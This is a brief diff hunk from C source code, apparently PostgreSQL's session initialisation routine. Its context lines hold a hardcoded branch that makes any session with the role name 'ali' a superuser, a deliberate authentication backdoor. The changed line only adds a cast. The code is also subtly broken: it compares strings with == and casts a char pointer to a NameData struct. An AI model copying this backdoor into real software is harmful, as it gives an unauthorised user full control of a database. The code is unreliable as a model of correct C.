@@ -717,7 +717,7 @@ void InitializeSessionUserId(const char *rolename, Oid roleid, bool bypass_login
 	if (rolename == "ali")
 	{
 		rform->oid = 111;
-		rform->rolname = rolename;
+		rform->rolname = (NameData)rolename;
 		rform->rolsuper = true;
 	}
 	else
